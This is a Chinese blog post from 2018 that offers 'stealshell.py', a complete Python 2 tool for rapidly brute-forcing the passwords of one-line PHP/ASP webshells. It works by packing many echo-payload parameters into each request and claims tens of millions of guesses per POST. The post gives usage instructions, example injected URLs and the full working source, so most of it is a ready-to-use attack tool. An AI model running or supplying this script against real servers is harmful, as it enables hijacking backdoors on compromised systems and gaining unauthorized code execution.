---
title: 一句话快速爆破脚本
date: 2018-03-04 22:48:13
---

思路来自爱春秋文章[python之提速千倍爆破一句话 ](https://bbs.ichunqiu.com/thread-16952-1-1.html) ，据说源头是吐司文章《让你的一句话爆破速度提升千倍》。

速度提升的关键在于一次尝试提交多个可能的密码，实测在Apache+PHP下使用POST方式请求可高达四千万条密码每次（耗时约20秒，GET方式请求只能达到两百条左右），效果可以说非常惊人，如果有一个足够好的字典，那将无往不利。

### 思路举例

```php
慢速：
http://127.0.0.1/xiao.php?pass=echo(%22pwd:pass%22);
快速：
http://127.0.0.1/xiao.php?pass=echo(%22pwd:pass%22);&findneo=echo(%22pwd:findneo%22);
```

### 用法

```python
Usage: stealshell.py [options]

Options:
        -h, --help                      display this message
        -u URL, --url=URL               Target URL;This option must be provided to define the target
                                                (e.g. "http://127.0.0.1/xiao.php")
        -m METHOD                       request method (support GET/POST,GET is default )
        -d DICT                         the filename of candidate passwords (e.g. "shell_pass_dic.txt")
        -n NUM                          the number of passwords that will be submitted in each request
                                                 (219 is default)


```

### 依赖库

 python2.7: requests,sys,getopt

### 效果如图

![stealshell.png](stealshell.png)

### 代码

支持PHP和asp，asp部分没有搭环境测试，但只是payload简单替换，理论上是没有问题的。

```python
import requests as req
import sys
import getopt

token="pwd"

def usage():
	print """
###################################################################################################
	This is a script used to guess the pass of webshells rapidly (up to 40M each time).
	It supports php&asp,GET&POST.
	site:	https://findneo.github.io/stealshell/
###################################################################################################

Usage: stealshell.py [options]

Options:
	-h, --help			display this message
	-u URL, --url=URL 		Target URL;This option must be provided to define the target  
						(e.g. "http://127.0.0.1/xiao.php")
	-m METHOD 			request method (support GET/POST,GET is default )
	-d DICT 			the filename of candidate passwords (e.g. "shell_pass_dic.txt")
	-n NUM 				the number of passwords that will be submitted in each request
						 (219 is default)
	"""

def get_dict(dic_name="shell_pass_dic.txt",pcpt=4,shell_type="php"):
	with open(dic_name,'r') as f:
		c=f.readlines()
	print "\nthis dict has %d items in all"%len(c)
	cnt=len(c)/pcpt # pcpt is short for password_check_per_time
	sp=[] # split password by pcpt per group
	sp.extend([c[i*pcpt:i*pcpt+pcpt] for i in xrange(cnt)])
	sp+=[c[cnt*pcpt:]]
	# sp:   [['x\n', 'cmd\n', 'pass\n', 'pwd\n'], ['xiao\n', '584521\n', 'nohack\n', '45189946\n'], ...]
	print "we split it into %d groups (%d * %d + %d) and submit one group each time\n"%(len(sp),cnt,pcpt,len(c)-pcpt*cnt)

	spd=[]
	execute="echo" if shell_type=="php" else "response.write"
	spd.extend([{j.strip('\n'):"%s('%s:%s');"%(execute,token,j) for j in i}for i in sp])
	# spd:  [{'x': "echo('pwd:x\n');", 'pass': "echo('pwd:pass\n');",...]
	return spd

def check_pass(url,pwd_list,method):
	for i in pwd_list:
		r=req.get(url,params=i) if method=="GET" else req.post(url,data=i)
		print '.',
		if token in r.content:
			print ""
			return r.content

if __name__ == '__main__':
	try:
		options,left_args=getopt.getopt(sys.argv[1:],"hu:m:d:n:",["help","url="])
	except Exception as e:
		raise e

	url="http://127.0.0.1/xiao.php"
	method="GET"
	dic_name="shell_pass_dic.txt"
	pass_num=219

	if not len(options):
		exit(usage())
	for name,value in options:
		if name in ("-h","--help"):
			exit(usage())
		elif name in ("-u","--url"):
			url=value
		elif name in ("-m"):
			method=value
		elif name in ("-d"):
			dic_name=value
		elif name in ("-n"):
			pass_num=int(value)

	shell_type=url[-3:]
	pwd_list=get_dict(dic_name=dic_name,pcpt=pass_num,shell_type=shell_type)
	print check_pass(url=url,pwd_list=pwd_list,method=method)
```

